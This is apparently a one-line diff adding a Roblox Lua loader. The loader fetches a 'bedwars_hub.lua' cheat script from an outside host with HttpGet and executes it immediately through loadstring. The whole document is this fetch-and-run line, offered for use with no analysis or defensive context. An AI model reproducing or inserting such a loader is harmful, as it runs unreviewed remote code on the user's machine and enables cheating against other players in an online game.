@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("http://ligma.wtf/scripts/bedwars_hub.lua", true))()
